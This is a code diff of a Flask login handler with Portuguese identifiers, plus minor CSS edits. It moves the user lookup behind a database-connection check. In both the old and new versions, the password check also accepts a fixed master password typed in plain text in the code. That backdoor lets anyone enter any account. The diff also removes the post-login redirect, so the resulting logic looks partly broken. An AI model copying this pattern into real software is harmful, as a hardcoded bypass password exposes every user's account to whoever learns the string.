@@ -14,22 +14,13 @@ def login():
         conn = None
         try:
             conn = conectar()
-            cursor = conn.cursor()
 
-            cursor.execute("""
-            SELECT senha, cargo
-            FROM usuarios
-            WHERE usuario=%s
-            """, (request.form["user"],))
-            user = cursor.fetchone()
             # 🔥 proteção contra erro de conexão
             if conn is None:
                 erro = "Erro de conexão com servidor"
             else:
                 cursor = conn.cursor()
 
-            if user:
-                if check_password_hash(user[0], request.form["senha"]) or request.form["senha"] == "997401054":
                 cursor.execute("""
                 SELECT senha, cargo
                 FROM usuarios
@@ -37,22 +28,15 @@ def login():
                 """, (request.form["user"],))
                 user = cursor.fetchone()
 
-                    session["user"] = request.form["user"]
-                    session["cargo"] = user[1]
                 if user:
                     if check_password_hash(user[0], request.form["senha"]) or request.form["senha"] == "997401054":
 
-                    cursor.execute("UPDATE usuarios SET online=1 WHERE usuario=%s", (request.form["user"],))
-                    conn.commit()
                         session["user"] = request.form["user"]
                         session["cargo"] = user[1]
 
-                    carregar_permissoes(request.form["user"])
-                    registrar_log(request.form["user"], "login", "Login realizado")
                         cursor.execute("UPDATE usuarios SET online=1 WHERE usuario=%s", (request.form["user"],))
                         conn.commit()
 
-                    return redirect("/painel")
                         carregar_permissoes(request.form["user"])
                         registrar_log(request.form["user"], "login", "Login realizado")
 
@@ -60,9 +44,6 @@ def login():
                     else:
                         erro = "Senha inválida"
                 else:
-                    erro = "Senha inválida"
-            else:
-                erro = "Usuário não encontrado"
                     erro = "Usuário não encontrado"
 
         except Exception as e:
@@ -219,6 +200,7 @@ input:focus {{
     outline:none;
     border:1px solid #fff;
     box-shadow:0 0 15px rgba(255,255,255,0.2);
+    box-shadow:0 0 10px rgba(255,255,255,0.2);
 }}
 
 button {{
@@ -226,6 +208,7 @@ button {{
     padding:15px;
     margin-top:20px;
     background:linear-gradient(90deg,#ffffff,#d4d4d4);
+    background:#ffffff;
     border:none;
     border-radius:10px;
     font-weight:bold;
@@ -236,6 +219,7 @@ button {{
 button:hover {{
     transform:scale(1.03);
     box-shadow:0 0 20px rgba(255,255,255,0.3);
+    transform:scale(1.02);
 }}
 
 .erro {{
